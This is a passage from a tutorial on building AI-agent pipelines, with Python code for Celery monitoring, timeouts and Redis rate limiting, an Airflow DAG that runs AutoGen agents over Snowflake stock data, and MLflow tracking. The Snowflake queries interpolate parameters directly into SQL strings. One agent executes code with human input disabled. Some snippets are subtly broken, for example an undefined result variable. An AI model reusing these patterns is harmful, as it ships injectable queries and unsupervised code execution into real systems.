**Key Advantages:**

1. **Task Orchestration**: Celery provides robust task queuing and scheduling for asynchronous agent operations
2. **Persistence**: Django models provide structured data storage with proper relationships
3. **Scalability**: Tasks can be distributed across multiple workers
4. **Semantic Search**: Pinecone enables fast vector search for knowledge retrieval
5. **Easy API Development**: Django REST Framework provides a clean API interface

**Production Considerations:**

1. **Task Queue Monitoring**:

For production systems, you would want to add proper monitoring for Celery tasks:

```python
# monitoring/celery_monitoring.py
from flower.utils.broker import Broker
from celery.events.state import State
import logging
import json
import time
import requests

logger = logging.getLogger('agent_app.monitoring')

class CeleryMonitor:
    """Monitor for Celery tasks and workers."""
    
    def __init__(self, broker_url):
        self.broker_url = broker_url
        self.state = State()
        self.broker = Broker(broker_url)
    
    def get_worker_stats(self):
        """Get statistics about active Celery workers."""
        try:
            stats = self.broker.info()
            return {
                "active_workers": stats.get("active_workers", 0),
                "worker_heartbeats": stats.get("worker_heartbeats", {}),
                "processed_tasks": stats.get("processed", 0),
                "failed_tasks": stats.get("failed", 0),
                "broker_queue_sizes": stats.get("queue_size", {})
            }
        except Exception as e:
            logger.error(f"Error getting worker stats: {str(e)}")
            return {
                "error": str(e),
                "timestamp": time.time()
            }
    
    def get_task_stats(self):
        """Get statistics about task processing."""
        try:
            # This would typically connect to Flower API or Redis directly
            # Example using Flower API if it's running
            response = requests.get("http://localhost:5555/api/tasks")
            tasks = response.json()
            
            # Calculate statistics
            task_count = len(tasks)
            
            # Count tasks by status
            status_counts = {}
            for task_id, task in tasks.items():
                status = task.get("state", "UNKNOWN")
                status_counts[status] = status_counts.get(status, 0) + 1
            
            # Count tasks by type
            type_counts = {}
            for task_id, task in tasks.items():
                task_name = task.get("name", "UNKNOWN")
                type_counts[task_name] = type_counts.get(task_name, 0) + 1
            
            return {
                "task_count": task_count,
                "status_counts": status_counts,
                "type_counts": type_counts
            }
        except Exception as e:
            logger.error(f"Error getting task stats: {str(e)}")
            return {
                "error": str(e),
                "timestamp": time.time()
            }
    
    def check_health(self):
        """Check if Celery is healthy."""
        try:
            worker_stats = self.get_worker_stats()
            
            # Consider unhealthy if no active workers
            if worker_stats.get("active_workers", 0) == 0:
                return {
                    "status": "unhealthy",
                    "reason": "No active workers",
                    "timestamp": time.time()
                }
            
            # Consider unhealthy if excessive failed tasks
            if worker_stats.get("failed_tasks", 0) > 1000:
                return {
                    "status": "degraded",
                    "reason": "High failure rate",
                    "timestamp": time.time()
                }
            
            return {
                "status": "healthy",
                "active_workers": worker_stats.get("active_workers", 0),
                "timestamp": time.time()
            }
        except Exception as e:
            logger.error(f"Error checking Celery health: {str(e)}")
            return {
                "status": "unknown",
                "error": str(e),
                "timestamp": time.time()
            }
```

2. **Handling Long-Running Tasks**:

For production, you should implement proper handling of long-running tasks:

```python
# long_running_task_handler.py
import time
import signal
import threading
from functools import wraps
from celery.exceptions import SoftTimeLimitExceeded

def timeout_handler(func=None, timeout=1800, callback=None):
    """
    Decorator to handle timeouts for long-running functions.
    
    Args:
        func: The function to decorate
        timeout: Timeout in seconds
        callback: Function to call on timeout
        
    Returns:
        Decorated function
    """
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            # Store the result
            result = [None]
            exception = [None]
            
            # Define thread target
            def target():
                try:
                    result[0] = f(*args, **kwargs)
                except Exception as e:
                    exception[0] = e
            
            # Create and start thread
            thread = threading.Thread(target=target)
            thread.daemon = True
            thread.start()
            
            # Wait for thread to complete or timeout
            thread.join(timeout)
            
            # Handle timeout
            if thread.is_alive():
                if callback:
                    callback()
                
                # Raise timeout exception
                raise TimeoutError(f"Function {f.__name__} timed out after {timeout} seconds")
            
            # Handle exception
            if exception[0]:
                raise exception[0]
            
            return result[0]
        
        return wrapped
    
    if func:
        return decorator(func)
    
    return decorator

# Example usage in task
@shared_task(bind=True)
def complex_analysis_task(self, task_id):
    try:
        # Get task
        task = AgentTask.objects.get(id=task_id)
        task.set_processing(self.request.id)
        
        # Define timeout callback
        def on_timeout():
            logger.error(f"Task {task_id} timed out")
            task.set_failed("Task exceeded time limit")
        
        # Use timeout handler for complex processing
        @timeout_handler(timeout=1800, callback=on_timeout)
        def run_complex_analysis(data):
            # Complex analysis code here
            # ...
            return result
        
        # Run with timeout handler
        result = run_complex_analysis(task.input_data)
        
        # Update task
        task.set_completed(result)
        return result
        
    except SoftTimeLimitExceeded:
        logger.error(f"Task {task_id} exceeded soft time limit")
        task.set_failed("Task exceeded time limit")
        return {"error": "Task exceeded time limit"}
    
    except TimeoutError as e:
        logger.error(f"Task {task_id} timed out: {str(e)}")
        task.set_failed(f"Task timed out: {str(e)}")
        return {"error": str(e)}
    
    except Exception as e:
        logger.error(f"Error in task {task_id}: {str(e)}")
        task.set_failed(str(e))
        return {"error": str(e)}
```

3. **Rate Limiting and Backoff**:

For production, implement rate limiting and exponential backoff:

```python
# rate_limiting.py
import time
import redis
import functools
import random
import logging

logger = logging.getLogger('agent_app.rate_limiting')

class RateLimiter:
    """Rate limiter using Redis."""
    
    def __init__(self, redis_url, limit_key, limit_rate, limit_period=60):
        """
        Initialize rate limiter.
        
        Args:
            redis_url: Redis URL
            limit_key: Key prefix for rate limiting
            limit_rate: Maximum number of calls
            limit_period: Period in seconds
        """
        self.redis = redis.from_url(redis_url)
        self.limit_key = limit_key
        self.limit_rate = limit_rate
        self.limit_period = limit_period
    
    def is_rate_limited(self, subkey=None):
        """
        Check if the current call is rate limited.
        
        Args:
            subkey: Optional subkey for more granular limiting
            
        Returns:
            bool: True if rate limited, False otherwise
        """
        key = f"{self.limit_key}:{subkey}" if subkey else self.limit_key
        
        # Get current count
        current = self.redis.get(key)
        
        # If no current count, initialize
        if current is None:
            self.redis.set(key, 1, ex=self.limit_period)
            return False
        
        # Increment count
        count = self.redis.incr(key)
        
        # Check if rate limited
        if count > self.limit_rate:
            # Get TTL to know how long until reset
            ttl = self.redis.ttl(key)
            logger.warning(f"Rate limited for {key}. TTL: {ttl}")
            return True
        
        return False
    
    def get_remaining(self, subkey=None):
        """Get remaining calls allowed."""
        key = f"{self.limit_key}:{subkey}" if subkey else self.limit_key
        
        # Get current count
        current = self.redis.get(key)
        
        if current is None:
            return self.limit_rate
        
        return max(0, self.limit_rate - int(current))
    
    def get_reset_time(self, subkey=None):
        """Get time until rate limit resets."""
        key = f"{self.limit_key}:{subkey}" if subkey else self.limit_key
        
        # Get TTL
        ttl = self.redis.ttl(key)
        
        if ttl < 0:
            return 0
        
        return ttl

def with_rate_limiting(limiter, subkey_func=None, max_retries=3, backoff_base=2):
    """
    Decorator for rate limiting functions.
    
    Args:
        limiter: RateLimiter instance
        subkey_func: Function to extract subkey from args/kwargs
        max_retries: Maximum number of retries
        backoff_base: Base for exponential backoff
        
    Returns:
        Decorated function
    """
    def decorator(func):
        @functools.wraps(func)
        def wrapped(*args, **kwargs):
            # Get subkey if provided
            subkey = None
            if subkey_func:
                subkey = subkey_func(*args, **kwargs)
            
            retries = 0
            while retries <= max_retries:
                # Check rate limiting
                if limiter.is_rate_limited(subkey):
                    # If max retries reached, raise exception
                    if retries >= max_retries:
                        reset_time = limiter.get_reset_time(subkey)
                        raise RateLimitExceeded(
                            f"Rate limit exceeded. Try again in {reset_time} seconds."
                        )
                    
                    # Calculate backoff with jitter
                    backoff = (backoff_base ** retries) + random.uniform(0, 0.5)
                    
                    # Log and sleep
                    logger.info(f"Rate limited. Retrying in {backoff:.2f} seconds. Retry {retries+1}/{max_retries}")
                    time.sleep(backoff)
                    
                    retries += 1
                else:
                    # Not rate limited, execute function
                    return func(*args, **kwargs)
            
            # Should not reach here due to exception above
            return None
        
        return wrapped
    
    return decorator

class RateLimitExceeded(Exception):
    """Exception raised when rate limit is exceeded."""
    pass

# Example usage
# Initialize limiter for OpenAI API
openai_limiter = RateLimiter(
    redis_url="redis://localhost:6379/0",
    limit_key="openai_api",
    limit_rate=100,  # 100 requests per minute
    limit_period=60
)

# Use in function
@with_rate_limiting(
    limiter=openai_limiter,
    subkey_func=lambda user_id, *args, **kwargs: f"user:{user_id}",
    max_retries=3
)
def call_openai_api(user_id, prompt):
    # API call here
    pass
```

This stack is particularly well-suited for organizations that need to:

- Build complex task orchestration systems with AI agents
- Maintain a centralized knowledge base for semantic search
- Implement conversational applications with persistent state
- Create document processing workflows with AI analysis
- Support background processing with robust task management

### Airflow + AutoGen + OpenAI Functions + Snowflake (Enterprise AI Automation)

This stack is optimized for enterprise-grade AI workflows that require robust scheduling, governance, and integration with enterprise data platforms. It's particularly well-suited for data-intensive applications that need to operate on a schedule and integrate with existing data infrastructure.

**Architecture Overview:**

![Airflow + AutoGen + Snowflake Architecture](https://i.imgur.com/sY0F3QK.png)

The architecture consists of:

1. **Apache Airflow**: Workflow orchestration engine for scheduling and monitoring
2. **AutoGen**: Multi-agent orchestration framework
3. **OpenAI Functions**: Structured function calling for agents
4. **Snowflake**: Enterprise data platform for storage and analytics
5. **MLflow**: Experiment tracking and model registry

**Implementation Example:**

Let's implement an Airflow DAG that orchestrates AI agents to analyze financial data in Snowflake:

```python
# dags/financial_analysis_agent_dag.py
import os
import json
import datetime
import tempfile
import pendulum
import autogen
import pandas as pd
import snowflake.connector
from snowflake.connector.pandas_tools import write_pandas
import openai
import requests
import mlflow
from io import StringIO

from airflow import DAG
from airflow.models import Variable
from airflow.operators.python import PythonOperator
from airflow.operators.trigger_dagrun import TriggerDagRunOperator
from airflow.providers.snowflake.operators.snowflake import SnowflakeOperator
from airflow.providers.snowflake.hooks.snowflake import SnowflakeHook
from airflow.utils.dates import days_ago
from airflow.models.param import Param

# Connect to OpenAI with API key from Airflow Variable
openai_api_key = Variable.get("OPENAI_API_KEY", default_var="")
os.environ["OPENAI_API_KEY"] = openai_api_key
openai.api_key = openai_api_key

# Default arguments for DAG
default_args = {
    'owner': 'data_science',
    'depends_on_past': False,
    'email': ['data_science@example.com'],
    'email_on_failure': True,
    'email_on_retry': False,
    'retries': 1,
    'retry_delay': datetime.timedelta(minutes=5),
}

# Define DAG
dag = DAG(
    'financial_analysis_agent',
    default_args=default_args,
    description='AI agent pipeline for financial data analysis',
    schedule_interval='0 4 * * 1-5',  # 4 AM on weekdays
    start_date=days_ago(1),
    catchup=False,
    max_active_runs=1,
    concurrency=3,
    tags=['ai_agents', 'finance', 'analysis'],
    params={
        'analysis_date': Param(
            default=pendulum.now().subtract(days=1).to_date_string(),
            type='string',
            format='date'
        ),
        'stock_symbols': Param(
            default='["AAPL", "MSFT", "GOOGL", "AMZN", "META"]',
            type='string'
        ),
        'report_type': Param(
            default='standard',
            type='string',
            enum=['standard', 'detailed', 'executive']
        ),
        'include_sentiment': Param(
            default=True,
            type='boolean'
        )
    }
)

# Helper functions
def get_snowflake_connection():
    """Get Snowflake connection from Airflow hook."""
    hook = SnowflakeHook(snowflake_conn_id='snowflake_default')
    conn = hook.get_conn()
    return conn

def fetch_stock_data(date_str, symbols):
    """Fetch stock data from Snowflake for specified date and symbols."""
    symbols_str = ", ".join([f"'{s}'" for s in symbols])
    query = f"""
    SELECT 
        symbol,
        date,
        open,
        high,
        low,
        close,
        volume,
        adj_close
    FROM 
        finance.stocks.daily_prices
    WHERE 
        date = '{date_str}'
        AND symbol IN ({symbols_str})
    ORDER BY 
        symbol, date
    """
    
    conn = get_snowflake_connection()
    cursor = conn.cursor()
    cursor.execute(query)
    
    # Convert to Pandas DataFrame
    result = cursor.fetchall()
    columns = [desc[0] for desc in cursor.description]
    df = pd.DataFrame(result, columns=columns)
    cursor.close()
    
    return df

def fetch_financial_news(date_str, symbols):
    """Fetch financial news from Snowflake for specified date and symbols."""
    symbols_str = ", ".join([f"'{s}'" for s in symbols])
    query = f"""
    SELECT 
        headline,
        source,
        url,
        published_at,
        sentiment,
        symbols
    FROM 
        finance.news.articles
    WHERE 
        DATE(published_at) = '{date_str}'
        AND symbols_array && ARRAY_CONSTRUCT({symbols_str})
    ORDER BY 
        published_at DESC
    LIMIT 
        50
    """
    
    conn = get_snowflake_connection()
    cursor = conn.cursor()
    cursor.execute(query)
    
    # Convert to Pandas DataFrame
    result = cursor.fetchall()
    columns = [desc[0] for desc in cursor.description]
    df = pd.DataFrame(result, columns=columns)
    cursor.close()
    
    return df

def store_analysis_results(analysis_results, date_str):
    """Store analysis results in Snowflake."""
    # Create DataFrame from analysis results
    if isinstance(analysis_results, str):
        # If results are a string (like JSON), parse it
        try:
            results_dict = json.loads(analysis_results)
        except:
            # If not valid JSON, create a simple dict
            results_dict = {"analysis_text": analysis_results}
    else:
        # Already a dict-like object
        results_dict = analysis_results
    
    # Flatten nested dictionaries
    flat_results = {}
    for key, value in results_dict.items():
        if isinstance(value, dict):
            for sub_key, sub_value in value.items():
                if isinstance(sub_value, (dict, list)):
                    flat_results[f"{key}_{sub_key}"] = json.dumps(sub_value)
                else:
                    flat_results[f"{key}_{sub_key}"] = sub_value
        elif isinstance(value, list):
            flat_results[key] = json.dumps(value)
        else:
            flat_results[key] = value
    
    # Add analysis date
    flat_results['analysis_date'] = date_str
    flat_results['created_at'] = datetime.datetime.now().isoformat()
    
    # Create DataFrame
    df = pd.DataFrame([flat_results])
    
    # Upload to Snowflake
    conn = get_snowflake_connection()
    success, num_chunks, num_rows, output = write_pandas(
        conn=conn,
        df=df,
        table_name='AGENT_ANALYSIS_RESULTS',
        schema='REPORTS',
        database='FINANCE'
    )
    
    conn.close()
    
    return {
        'success': success,
        'num_rows': num_rows,
        'table': 'FINANCE.REPORTS.AGENT_ANALYSIS_RESULTS'
    }

# Task functions
def extract_data(**context):
    """Extract relevant financial data for analysis."""
    # Get parameters
    params = context['params']
    analysis_date = params.get('analysis_date')
    stock_symbols = json.loads(params.get('stock_symbols'))
    
    # Fetch stock price data
    stock_data = fetch_stock_data(analysis_date, stock_symbols)
    if stock_data.empty:
        raise ValueError(f"No stock data found for {analysis_date} and symbols {stock_symbols}")
    
    # Fetch financial news
    news_data = fetch_financial_news(analysis_date, stock_symbols) if params.get('include_sentiment') else pd.DataFrame()
    
    # Calculate basic metrics
    metrics = {}
    for symbol in stock_symbols:
        symbol_data = stock_data[stock_data['symbol'] == symbol]
        if not symbol_data.empty:
            metrics[symbol] = {
                'open': float(symbol_data['open'].iloc[0]),
                'close': float(symbol_data['close'].iloc[0]),
                'high': float(symbol_data['high'].iloc[0]),
                'low': float(symbol_data['low'].iloc[0]),
                'volume': int(symbol_data['volume'].iloc[0]),
                'daily_change': float(symbol_data['close'].iloc[0] - symbol_data['open'].iloc[0]),
                'daily_change_pct': float((symbol_data['close'].iloc[0] - symbol_data['open'].iloc[0]) / symbol_data['open'].iloc[0] * 100)
            }
    
    # Prepare data for AI analysis
    analysis_data = {
        'date': analysis_date,
        'symbols': stock_symbols,
        'stock_data': stock_data.to_dict(orient='records'),
        'metrics': metrics,
        'news_data': news_data.to_dict(orient='records') if not news_data.empty else []
    }
    
    # Save to XCom for next task
    context['ti'].xcom_push(key='analysis_data', value=analysis_data)
    
    return analysis_data

def run_analysis_agents(**context):
    """Run AI agents for financial analysis."""
    # Get parameters and data
    params = context['params']
    analysis_data = context['ti'].xcom_pull(task_ids='extract_data', key='analysis_data')
    report_type = params.get('report_type')
    
    # Configure OpenAI 
    client = openai.OpenAI(api_key=openai_api_key)
    
    # Define AutoGen agents for financial analysis
    
    # 1. Financial Analyst Agent - Core analysis
    analyst_agent = autogen.AssistantAgent(
        name="FinancialAnalyst",
        llm_config={
            "config_list": [{"model": "gpt-4-turbo", "api_key": openai_api_key}],
            "temperature": 0.2,
            "functions": [
                {
                    "name": "analyze_stock_performance",
                    "description": "Analyze the performance of stocks based on price data",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "symbol": {"type": "string", "description": "Stock symbol to analyze"},
                            "metrics": {
                                "type": "object",
                                "description": "Performance metrics to calculate"
                            },
                            "context": {"type": "string", "description": "Additional context for analysis"}
                        },
                        "required": ["symbol", "metrics"]
                    }
                },
                {
                    "name": "analyze_news_sentiment",
                    "description": "Analyze sentiment from news articles",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "symbol": {"type": "string", "description": "Stock symbol to analyze news for"},
                            "news_items": {"type": "array", "description": "List of news articles"},
                            "summary_length": {"type": "integer", "description": "Length of summary to generate"}
                        },
                        "required": ["symbol", "news_items"]
                    }
                }
            ]
        },
        system_message="""You are an expert financial analyst specialized in stock market analysis. 
        Your task is to analyze stock performance and provide insights based on price data and news.
        Be analytical, precise, and focus on data-driven insights. 
        Consider market trends, volatility, and comparative performance when analyzing stocks.
        Your analysis should be suitable for institutional investors and financial professionals."""
    )
    
    # 2. Data Scientist Agent - Advanced metrics and models
    data_scientist_agent = autogen.AssistantAgent(
        name="DataScientist",
        llm_config={
            "config_list": [{"model": "gpt-4-turbo", "api_key": openai_api_key}],
            "temperature": 0.1,
            "functions": [
                {
                    "name": "calculate_technical_indicators",
                    "description": "Calculate technical indicators for stock analysis",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "symbol": {"type": "string", "description": "Stock symbol"},
                            "price_data": {"type": "object", "description": "Price data for the stock"},
                            "indicators": {"type": "array", "items": {"type": "string"}, "description": "Indicators to calculate"}
                        },
                        "required": ["symbol", "price_data"]
                    }
                },
                {
                    "name": "compare_performance",
                    "description": "Compare performance between multiple stocks",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "symbols": {"type": "array", "items": {"type": "string"}, "description": "Stock symbols to compare"},
                            "metrics": {"type": "object", "description": "Metrics for each stock"}
                        },
                        "required": ["symbols", "metrics"]
                    }
                }
            ]
        },
        system_message="""You are an expert data scientist specializing in financial markets.
        Your role is to perform advanced statistical analysis and calculate technical indicators.
        Focus on quantitative metrics, correlations, and statistical significance.
        Identify patterns and anomalies in the data that might not be immediately obvious.
        Your analysis should be rigorous and mathematically sound."""
    )
    
    # 3. Report Writer Agent - Generate final report
    report_writer_agent = autogen.AssistantAgent(
        name="ReportWriter",
        llm_config={
            "config_list": [{"model": "gpt-4-turbo", "api_key": openai_api_key}],
            "temperature": 0.7,
            "functions": [
                {
                    "name": "generate_financial_report",
                    "description": "Generate a comprehensive financial report",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "title": {"type": "string", "description": "Report title"},
                            "date": {"type": "string", "description": "Analysis date"},
                            "summary": {"type": "string", "description": "Executive summary"},
                            "stock_analyses": {"type": "object", "description": "Analysis for each stock"},
                            "market_overview": {"type": "string", "description": "Overall market context"},
                            "recommendations": {"type": "array", "items": {"type": "string"}, "description": "Investment recommendations"},
                            "report_type": {"type": "string", "enum": ["standard", "detailed", "executive"], "description": "Type of report to generate"}
                        },
                        "required": ["title", "date", "stock_analyses", "report_type"]
                    }
                }
            ]
        },
        system_message="""You are an expert financial report writer.
        Your task is to synthesize financial analysis into clear, professional reports.
        Organize information logically with appropriate sections and headers.
        Use precise financial terminology while keeping the content accessible.
        Highlight key insights and structure the report according to the specified type:
        - standard: Balanced detail and length for general professional use
        - detailed: Comprehensive analysis with extensive data and charts
        - executive: Concise summary focused on key takeaways and recommendations"""
    )
    
    # User proxy agent to coordinate the workflow
    user_proxy = autogen.UserProxyAgent(
        name="FinancialDataManager",
        human_input_mode="NEVER",
        code_execution_config={"work_dir": "financial_analysis_workspace"}
    )
    
    # Create a group chat for the agents
    groupchat = autogen.GroupChat(
        agents=[user_proxy, analyst_agent, data_scientist_agent, report_writer_agent],
        messages=[],
        max_round=15
    )
    manager = autogen.GroupChatManager(groupchat=groupchat)
    
    # Start the analysis process
    stock_data_str = json.dumps(analysis_data['stock_data'][:5]) if len(analysis_data['stock_data']) > 5 else json.dumps(analysis_data['stock_data'])
    news_data_str = json.dumps(analysis_data['news_data'][:5]) if len(analysis_data['news_data']) > 5 else json.dumps(analysis_data['news_data'])
    
    prompt = f"""
    Task: Perform financial analysis for the following stocks: {analysis_data['symbols']} on {analysis_data['date']}.
    
    Report Type: {report_type}
    
    Stock Metrics:
    {json.dumps(analysis_data['metrics'], indent=2)}
    
    Sample Stock Data:
    {stock_data_str}
    
    Sample News Data:
    {news_data_str}
    
    Create a comprehensive financial analysis report with the following components:
    1. Market overview for the date
    2. Individual stock analysis for each symbol
    3. Comparative performance analysis
    4. Key insights and patterns
    5. Recommendations based on the data
    
    The FinancialAnalyst should begin by analyzing each stock's performance.
    The DataScientist should then calculate technical indicators and compare performance.
    Finally, the ReportWriter should compile all analyses into a coherent report.
    
    The final deliverable should be a complete financial analysis report in the requested format.
    """
    
    # Start the group chat
    result = user_proxy.initiate_chat(manager, message=prompt)
    
    # Extract the final report from the chat
    final_report = None
    for message in reversed(user_proxy.chat_history):
        if message['role'] == 'assistant' and 'ReportWriter' in message.get('name', ''):
            final_report = message['content']
            break
    
    if not final_report:
        # Extract best available result if no clear final report
        for message in reversed(user_proxy.chat_history):
            if message['role'] == 'assistant' and len(message['content']) > 500:
                final_report = message['content']
                break
    
    # Process and structure the report
    try:
        # Try to extract structured data using OpenAI
        structure_response = client.chat.completions.create(
            model="gpt-4-turbo",
            messages=[
                {"role": "system", "content": "You are a financial data extraction specialist. Extract structured data from financial analysis reports."},
                {"role": "user", "content": f"Extract the key structured data from this financial report in JSON format. Include market_overview, stock_analyses (with individual metrics for each stock), key_insights, and recommendations:\n\n{final_report}"}
            ],
            response_format={"type": "json_object"}
        )
        
        structured_report = json.loads(structure_response.choices[0].message.content)
    except Exception as e:
        # Fall back to simple structure if extraction fails
        structured_report = {
            "report_text": final_report,
            "report_type": report_type,
            "analysis_date": analysis_data['date'],
            "symbols": analysis_data['symbols']
        }
    
    # Combine structured report with raw text
    final_result = {
        "structured_data": structured_report,
        "full_report": final_report,
        "report_type": report_type,
        "analysis_date": analysis_data['date'],
        "symbols_analyzed": analysis_data['symbols'],
        "generation_metadata": {
            "timestamp": datetime.datetime.now().isoformat(),
            "model": "gpt-4-turbo",
            "agent_framework": "AutoGen"
        }
    }
    
    # Log with MLflow if enabled
    try:
        mlflow.start_run(run_name=f"financial_analysis_{analysis_data['date']}")
        
        # Log parameters
        mlflow.log_params({
            "analysis_date": analysis_data['date'],
            "symbols": ",".join(analysis_data['symbols']),
            "report_type": report_type,
            "include_sentiment": params.get('include_sentiment')
        })
        
        # Log metrics if available
        if 'structured_data' in final_result and 'stock_analyses' in final_result['structured_data']:
            for symbol, analysis in final_result['structured_data']['stock_analyses'].items():
                if isinstance(analysis, dict):
                    for metric, value in analysis.items():
                        if isinstance(value, (int, float)):
                            mlflow.log_metric(f"{symbol}_{metric}", value)
        
        # Log report as artifact
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(final_report)
            report_path = f.name
        
        mlflow.log_artifact(report_path)
        os.unlink(report_path)
        
        # Log raw data sample
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(analysis_data, f)
            data_path = f.name
        
        mlflow.log_artifact(data_path)
        os.unlink(data_path)
        
        mlflow.end_run()
    except Exception as e:
        print(f"Error logging to MLflow: {e}")
    
    # Save to XCom for next task
    context['ti'].xcom_push(key='analysis_results', value=final_result)
    
    return final_result

def store_results(**context):
    """Store analysis results in Snowflake."""
    # Get analysis results
    analysis_results = context['ti'].xcom_pull(task_ids='run_analysis_agents', key='analysis_results')
    params = context['params']
    analysis_date = params.get('analysis_date')
    
    # Store in Snowflake
    storage_result = store_analysis_results(analysis_results, analysis_date)
    
    # Generate report file in S3 via Snowflake (optional)
    conn = get_snowflake_connection()
    cursor = conn.cursor()
    
    report_file_query = f"""
    COPY INTO @FINANCE.REPORTS.REPORT_STAGE/financial_reports/
    FROM (
        SELECT 
            OBJECT_CONSTRUCT('report', full_report, 'metadata', generation_metadata, 'date', analysis_date) AS report_json
        FROM 
            FINANCE.REPORTS.AGENT_ANALYSIS_RESULTS
        WHERE 
            analysis_date = '{analysis_date}'
        ORDER BY 
            created_at DESC
        LIMIT 1
    )
    FILE_FORMAT = (TYPE = JSON)
    OVERWRITE = TRUE
    SINGLE = TRUE
    HEADER = TRUE;
    """
    
    cursor.execute(report_file_query)
    file_result = cursor.fetchall()
    cursor.close()
    conn.close()
    
    # Return combined results
    result = {
        'snowflake_storage': storage_result,
        'report_file': file_result
    }
    
    return result

def notify_stakeholders(**context):
    """Send notification about completed analysis."""
    # Get parameters and results
    params = context['params']
    analysis_date = params.get('analysis_date')
    stock_symbols = json.loads(params.get('stock_symbols'))
    analysis_results = context['ti'].xcom_pull(task_ids='run_analysis_agents', key='analysis_results')
    
    # Extract key insights if available
    key_insights = []
    if ('structured_data' in analysis_results and 
        'key_insights' in analysis_results['structured_data']):
        if isinstance(analysis_results['structured_data']['key_insights'], list):
            key_insights = analysis_results['structured_data']['key_insights']
        elif isinstance(analysis_results['structured_data']['key_insights'], str):
            key_insights = [analysis_results['structured_data']['key_insights']]
    
    # Build notification content
    notification = {
        'title': f"Financial Analysis Report - {analysis_date}",
        'date': analysis_date,
        'symbols': stock_symbols,
        'key_insights': key_insights[:3],  # Just top 3 insights
        'report_url': f"https://analytics.example.com/reports/finance/{analysis_date.replace('-', '')}.html",
        'snowflake_table': "FINANCE.REPORTS.AGENT_ANALYSIS_RESULTS"
    }
    
    # Log notification (in production, would actually send via email/Slack)
    print(f"Would send notification: {json.dumps(notification, indent=2)}")
    
    # Return notification content
    return notification

# Define DAG tasks
extract_task = PythonOperator(
    task_id='extract_data',
    python_callable=extract_data,
    provide_context=True,
    dag=dag,
)

analysis_task = PythonOperator(
    task_id='run_analysis_agents',
    python_callable=run_analysis_agents,
    provide_context=True,
    dag=dag,
)

store_task = PythonOperator(
    task_id='store_results',
    python_callable=store_results,
    provide_context=True,
    dag=dag,
)

notify_task = PythonOperator(
    task_id='notify_stakeholders',
    python_callable=notify_stakeholders,
    provide_context=True,
    dag=dag,
)

# Set task dependencies
extract_task >> analysis_task >> store_task >> notify_task
```

For tracking experiments and agent performance, let's implement an MLflow tracking component:

```python
# mlflow_tracking.py
import os
import json
import mlflow
import datetime
import pandas as pd
from typing import Dict, Any, List, Optional

class AIAgentExperimentTracker:
    """Track AI agent experiments with MLflow."""
    
    def __init__(
        self, 
        experiment_name: str, 
        tracking_uri: Optional[str] = None,
        tags: Optional[Dict[str, str]] = None
    ):
        """
        Initialize the experiment tracker.
        
        Args:
            experiment_name: Name of the MLflow experiment
            tracking_uri: Optional URI for MLflow tracking server
            tags: Optional tags for the experiment
        """
        self.experiment_name = experiment_name
        
        # Set tracking URI if provided
        if tracking_uri:
            mlflow.set_tracking_uri(tracking_uri)
        
        # Set default tags
        self.default_tags = tags or {}
        
        # Get or create experiment
        try:
            self.experiment = mlflow.get_experiment_by_name(experiment_name)
            if not self.experiment:
                self.experiment_id = mlflow.create_experiment(
                    experiment_name,
                    tags=self.default_tags
                )
            else:
                self.experiment_id = self.experiment.experiment_id
        except Exception as e:
            print(f"Error initializing MLflow experiment: {e}")
            self.experiment_id = None
    
    def start_run(
        self, 
        run_name: Optional[str] = None,
        tags: Optional[Dict[str, str]] = None,
        agent_config: Optional[Dict[str, Any]] = None
    ) -> str:
        """
        Start a new MLflow run.
        
        Args:
            run_name: Optional name for the run
            tags: Optional tags for the run
            agent_config: Optional agent configuration to log
            
        Returns:
            str: MLflow run ID
        """
        # Generate default run name if not provided
        if not run_name:
            run_name = f"agent_run_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Combine default tags with run-specific tags
        run_tags = {**self.default_tags, **(tags or {})}
        
        try:
            # Start the run
            mlflow.start_run(
                experiment_id=self.experiment_id,
                run_name=run_name,
                tags=run_tags
            )
            
            # Log agent configuration if provided
            if agent_config:
                # Log nested dictionaries as separate params for better organization
                self._log_nested_params("agent", agent_config)
                
                # Also log the raw config as JSON artifact for preservation
                config_path = f"/tmp/agent_config_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(config_path, 'w') as f:
                    json.dump(agent_config, f, indent=2)
                
                mlflow.log_artifact(config_path)
                os.remove(config_path)
            
            return mlflow.active_run().info.run_id
            
        except Exception as e:
            print(f"Error starting MLflow run: {e}")
            return None
    
    def log_agent_interaction(
        self,
        agent_name: str,
        prompt: str,
        response: str,
        metrics: Optional[Dict[str, float]] = None,
        metadata: Optional[Dict[str, Any]] = None
    ):
        """
        Log an agent interaction.
        
        Args:
            agent_name: Name of the agent
            prompt: Prompt sent to agent
            response: Agent response
            metrics: Optional metrics for the interaction
            metadata: Optional metadata about the interaction
        """
        try:
            # Ensure we have an active run
            if not mlflow.active_run():
                self.start_run(f"{agent_name}_interactions")
            
            # Log metrics if provided
            if metrics:
                for key, value in metrics.items():
                    if isinstance(value, (int, float)):
                        mlflow.log_metric(f"{agent_name}_{key}", value)
            
            # Log metadata as parameters
            if metadata:
                flat_metadata = self._flatten_dict(metadata)
                for key, value in flat_metadata.items():
                    if isinstance(value, (str, int, float, bool)):
                        mlflow.log_param(f"{agent_name}_{key}", value)
            
            # Log the interaction as text
            interaction_path = f"/tmp/{agent_name}_interaction_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(interaction_path, 'w') as f:
                f.write(f"PROMPT:\n{prompt}\n\nRESPONSE:\n{response}")
            
            mlflow.log_artifact(interaction_path, artifact_path=f"interactions/{agent_name}")
            os.remove(interaction_path)
            
        except Exception as e:
            print(f"Error logging agent interaction: {e}")
    
    def log_agent_evaluation(
        self,
        evaluations: Dict[str, Any],
        metrics: Optional[Dict[str, float]] = None
    ):
        """
        Log agent evaluation results.
        
        Args:
            evaluations: Evaluation results
            metrics: Additional metrics to log
        """
        try:
            # Ensure we have an active run
            if not mlflow.active_run():
                self.start_run("agent_evaluation")
            
            # Log evaluation metrics
            if metrics:
                for key, value in metrics.items():
                    if isinstance(value, (int, float)):
                        mlflow.log_metric(key, value)
            
            # Log structured evaluations
